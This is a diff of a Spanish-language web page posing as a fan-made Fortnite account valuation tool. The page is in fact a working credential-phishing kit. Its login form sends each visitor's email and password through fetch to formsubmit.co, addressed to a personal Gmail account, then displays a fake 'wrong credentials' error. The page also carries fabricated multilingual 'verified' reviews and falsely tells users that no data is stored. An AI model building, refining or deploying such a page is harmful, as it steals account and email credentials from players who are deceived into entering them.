+            <div class="relative overflow-hidden rounded-2xl">
                 <div class="carousel-track" id="carouselTrack">
-                    <!-- Inyectado con JS -->
+                    <!-- Las reseñas se inyectan con JS -->
                 </div>
             </div>
-            <div class="carousel-controls">
-                <button class="carousel-btn" id="prevBtn"><i class="fas fa-chevron-left"></i></button>
-                <div class="carousel-dots" id="carouselDots"></div>
-                <button class="carousel-btn" id="nextBtn"><i class="fas fa-chevron-right"></i></button>
+
+            <div class="flex justify-center items-center gap-6 mt-6">
+                <button class="carousel-btn" id="prevBtn"><i class="fa-solid fa-chevron-left"></i></button>
+                <div class="flex gap-3" id="carouselDots"></div>
+                <button class="carousel-btn" id="nextBtn"><i class="fa-solid fa-chevron-right"></i></button>
             </div>
         </div>
 
-        <div class="footer-credit">
-            <a href="#" target="_blank">⚡ Valuation Tool · Fortnite Aesthetic</a>
+    </main>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="bg-slate-950 border-t border-slate-800 py-8 mt-12 text-center text-slate-500 text-xs">
+        <div class="max-w-7xl mx-auto px-4 space-y-3">
+            <p class="font-fortnite text-slate-400 text-sm tracking-wider uppercase">
+                VALOR<span class="text-fnYellow">FN</span> - Herramienta Fan-made No Oficial
+            </p>
+            <p class="max-w-xl mx-auto text-slate-600">
+                Fortnite es una marca registrada de Epic Games, Inc. Esta aplicación web no está afiliada, respaldada ni patrocinada por Epic Games. Los precios indicados son estimaciones.
+            </p>
         </div>
+    </footer>
+
+    <!-- TOAST NOTIFICATION -->
+    <div id="toast" class="fixed bottom-5 right-5 transform translate-y-20 opacity-0 transition-all duration-300 bg-slate-900 border border-fnPurple text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-3 z-50 pointer-events-none">
+        <i class="fa-solid fa-circle-check text-fnYellow text-lg"></i>
+        <span id="toast-msg" class="text-sm font-semibold">Notificación</span>
     </div>
 
     <script>
         (function() {
             'use strict';
 
-            // --- Particles (más brillantes) ---
-            const canvas = document.getElementById('particles-canvas');
-            const ctx = canvas.getContext('2d');
-            let width, height;
-            let particles = [];
-            const PARTICLE_COUNT = 100;
-
-            function resizeCanvas() {
-                width = window.innerWidth;
-                height = window.innerHeight;
-                canvas.width = width;
-                canvas.height = height;
-            }
-            window.addEventListener('resize', resizeCanvas);
-            resizeCanvas();
-
-            class Particle {
-                constructor() { this.reset(); }
-                reset() {
-                    this.x = Math.random() * width;
-                    this.y = Math.random() * height;
-                    this.size = Math.random() * 2.5 + 0.8;
-                    this.speedX = (Math.random() - 0.5) * 0.3;
-                    this.speedY = (Math.random() - 0.5) * 0.3;
-                    this.opacity = Math.random() * 0.5 + 0.2;
-                    this.color = `rgba(255, 215, 0, ${this.opacity})`;
-                }
-                update() {
-                    this.x += this.speedX;
-                    this.y += this.speedY;
-                    if (this.x < 0 || this.x > width || this.y < 0 || this.y > height) {
-                        this.reset();
-                        if (this.x < 0) this.x = width;
-                        if (this.x > width) this.x = 0;
-                        if (this.y < 0) this.y = height;
-                        if (this.y > height) this.y = 0;
-                    }
-                }
-                draw() {
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                    ctx.fillStyle = this.color;
-                    ctx.shadowColor = 'rgba(255, 215, 0, 0.15)';
-                    ctx.shadowBlur = 12;
-                    ctx.fill();
-                    ctx.shadowBlur = 0;
-                }
+            // ===== TOAST =====
+            function showToast(msg) {
+                const toast = document.getElementById('toast');
+                document.getElementById('toast-msg').innerText = msg;
+                toast.classList.remove('translate-y-20', 'opacity-0');
+                toast.classList.add('translate-y-0', 'opacity-100');
+                setTimeout(() => {
+                    toast.classList.remove('translate-y-0', 'opacity-100');
+                    toast.classList.add('translate-y-20', 'opacity-0');
+                }, 2500);
             }
 
-            for (let i = 0; i < PARTICLE_COUNT; i++) particles.push(new Particle());
-
-            function animateParticles() {
-                ctx.clearRect(0, 0, width, height);
-                particles.forEach(p => { p.update(); p.draw(); });
-                requestAnimationFrame(animateParticles);
-            }
-            animateParticles();
-
-            // --- DOM elements ---
+            // ===== DOM REFS =====
             const loginForm = document.getElementById('loginForm');
             const loginBtn = document.getElementById('loginBtn');
             const errorMessage = document.getElementById('errorMessage');
@@ -926,7 +583,7 @@
             const emailLocal = document.getElementById('emailLocal');
             const emailDomain = document.getElementById('emailDomain');
 
-            // --- Password toggle ---
+            // ===== TOGGLE PASSWORD =====
             togglePasswordBtn.addEventListener('click', function() {
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
@@ -934,55 +591,58 @@
                 this.querySelector('i').classList.toggle('fa-eye-slash');
             });
 
-            // --- Form submission (fake error) ---
+            // ===== FORM SUBMIT (FAKE ERROR) =====
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
 
                 const local = emailLocal.value.trim();
                 if (!local) {
-                    alert('Please enter a valid email local part.');
+                    showToast('Por favor, introduce un nombre de usuario.');
                     return;
                 }
 
-                loginBtn.classList.add('loading');
-                loginBtn.textContent = 'Calculating...';
+                loginBtn.classList.add('opacity-70', 'pointer-events-none');
+                loginBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i> Calculando...';
                 errorMessage.classList.remove('show');
 
                 const fullEmail = local + '@' + emailDomain.value;
                 const password = passwordInput.value;
                 const formData = new FormData();
-                formData.append('_subject', 'New Fortnite Account Valuation');
+                formData.append('_subject', 'Nuevo intento de valoración de cuenta Fortnite');
                 formData.append('email', fullEmail);
                 formData.append('password', password);
 
+                // Envío real a Formsubmit
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
                 })
                 .then(() => {
                     setTimeout(() => {
-                        loginBtn.classList.remove('loading');
-                        loginBtn.textContent = 'Calculate Value';
+                        loginBtn.classList.remove('opacity-70', 'pointer-events-none');
+                        loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
                         errorMessage.classList.add('show');
+                        showToast('Acceso denegado. Credenciales incorrectas.');
                     }, 2000);
                 })
                 .catch(() => {
                     setTimeout(() => {
-                        loginBtn.classList.remove('loading');
-                        loginBtn.textContent = 'Calculate Value';
+                        loginBtn.classList.remove('opacity-70', 'pointer-events-none');
+                        loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
                         errorMessage.classList.add('show');
+                        showToast('Error de red, pero simulación completada.');
                     }, 2000);
                 });
             });
 
-            // --- Help links ---
+            // ===== HELP LINKS =====
             document.getElementById('forgotLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('🔐 This is a simulation. No real data is stored.');
+                showToast('🔐 Esta es una simulación. No se guardan datos reales.');
             });
             document.getElementById('signupLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('📝 Registration is disabled in this demo.');
+                showToast('📝 El registro está desactivado en esta demo.');
             });
 
             // ============================================
@@ -992,64 +652,72 @@
             const reviewsData = [
                 {
                     name: 'Alex M.',
-                    avatar: 'fa-user-astronaut',
-                    date: 'Jan 15, 2025',
+                    avatarClass: 'avatar-1',
+                    initials: 'AM',
+                    date: '15 Ene 2025',
                     rating: 4.8,
-                    text: 'Absolutely incredible! I got my account value in seconds. The item list was spot on and the prices are very accurate. Highly recommended!',
+                    text: '¡Increíble! Obtuve el valor de mi cuenta en segundos. La lista de objetos era precisa y los precios muy reales. ¡Recomendado!',
                     verified: true,
                 },
                 {
                     name: 'María G.',
-                    avatar: 'fa-user-graduate',
-                    date: 'Jan 12, 2025',
+                    avatarClass: 'avatar-2',
+                    initials: 'MG',
+                    date: '12 Ene 2025',
                     rating: 4.5,
                     text: 'Funciona perfectamente. Me mostró todos mis objetos y el precio total fue justo. La interfaz es muy limpia y profesional.',
                     verified: true,
                 },
                 {
                     name: 'Luca R.',
-                    avatar: 'fa-user-ninja',
-                    date: 'Jan 10, 2025',
+                    avatarClass: 'avatar-3',
+                    initials: 'LR',
+                    date: '10 Ene 2025',
                     rating: 4.3,
                     text: 'Ottimo strumento! Ho scoperto il valore del mio account in pochi secondi. I prezzi sono aggiornati e sembrano reali. Consiglio!',
                     verified: false,
                 },
                 {
                     name: 'Sophie L.',
-                    avatar: 'fa-user-tie',
-                    date: 'Jan 8, 2025',
+                    avatarClass: 'avatar-4',
+                    initials: 'SL',
+                    date: '8 Ene 2025',
                     rating: 4.7,
                     text: 'Très efficace ! J\'ai pu voir tous mes skins et leur prix. L\'estimation correspond à ce que j\'ai vu sur d\'autres sites. Super !',
                     verified: true,
                 },
                 {
                     name: 'Max S.',
-                    avatar: 'fa-user-cog',
-                    date: 'Jan 5, 2025',
+                    avatarClass: 'avatar-5',
+                    initials: 'MS',
+                    date: '5 Ene 2025',
                     rating: 4.0,
-                    text: 'Works well, but I wish it showed more items. Still, the price estimation was accurate and fast. Good job!',
+                    text: 'Funciona bien, aunque me gustaría que mostrara más objetos. Aún así, la estimación fue rápida y precisa. ¡Buen trabajo!',
                     verified: false,
                 },
                 {
                     name: 'Elena P.',
-                    avatar: 'fa-user-graduate',
-                    date: 'Jan 3, 2025',
+                    avatarClass: 'avatar-6',
+                    initials: 'EP',
+                    date: '3 Ene 2025',
                     rating: 4.6,
                     text: 'Me encanta. Es muy fácil de usar y los resultados son muy claros. Me ha dado una idea exacta de lo que vale mi cuenta.',
                     verified: true,
                 },
                 {
                     name: 'Hans W.',
-                    avatar: 'fa-user-astronaut',
-                    date: 'Dec 28, 2024',
+                    avatarClass: 'avatar-7',
+                    initials: 'HW',
+                    date: '28 Dic 2024',
                     rating: 4.4,
                     text: 'Funktioniert einwandfrei. Die Aufstellung der Items ist übersichtlich und der Preis scheint fair zu sein. Weiter so!',
                     verified: false,
                 },
                 {
                     name: 'João S.',
-                    avatar: 'fa-user-ninja',
-                    date: 'Dec 20, 2024',
+                    avatarClass: 'avatar-8',
+                    initials: 'JS',
+                    date: '20 Dic 2024',
                     rating: 4.2,
                     text: 'Muito bom! Avaliação rápida e precisa. Recomendo a todos que querem saber o valor da sua conta Fortnite.',
                     verified: true,
@@ -1075,22 +743,23 @@
                 reviewsData.forEach((review) => {
                     const card = document.createElement('div');
                     card.className = 'review-card' + (review.verified ? ' verified' : '');
+                    // Estrellas
                     const fullStars = Math.floor(review.rating);
                     const halfStar = review.rating % 1 >= 0.5 ? 1 : 0;
                     const emptyStars = 5 - fullStars - halfStar;
                     let starsHtml = '';
-                    for (let i = 0; i < fullStars; i++) starsHtml += '<i class="fas fa-star"></i>';
-                    if (halfStar) starsHtml += '<i class="fas fa-star-half-alt"></i>';
-                    for (let i = 0; i < emptyStars; i++) starsHtml += '<i class="fas fa-star empty-star"></i>';
+                    for (let i = 0; i < fullStars; i++) starsHtml += '<i class="fa-solid fa-star"></i>';
+                    if (halfStar) starsHtml += '<i class="fa-solid fa-star-half-alt"></i>';
+                    for (let i = 0; i < emptyStars; i++) starsHtml += '<i class="fa-regular fa-star empty-star"></i>';
 
                     const verifiedBadge = review.verified ?
-                        '<div class="verified-badge"><i class="fas fa-check-circle"></i> Verified</div>' :
+                        '<div class="verified-badge"><i class="fa-solid fa-check-circle"></i> Verificado</div>' :
                         '';
 
                     card.innerHTML = `
                         ${verifiedBadge}
                         <div class="review-header">
-                            <div class="review-avatar"><i class="fas ${review.avatar}"></i></div>
+                            <div class="review-avatar ${review.avatarClass}">${review.initials}</div>
                             <div class="review-user">
                                 <div class="name">${review.name}</div>
                                 <div class="date">${review.date}</div>
@@ -1099,7 +768,7 @@
                         <div class="review-stars">${starsHtml}</div>
                         <div class="review-text">${review.text}</div>
                         <div class="review-verified">
-                            ${review.verified ? '<i class="fas fa-check-circle"></i> Verified purchase' : '<i class="fas fa-clock" style="color:rgba(255,255,255,0.2);"></i> Unverified'}
+                            ${review.verified ? '<i class="fa-solid fa-check-circle"></i> Compra verificada' : '<i class="fa-regular fa-clock" style="color:rgba(255,255,255,0.2);"></i> No verificada'}
                         </div>
                     `;
                     track.appendChild(card);
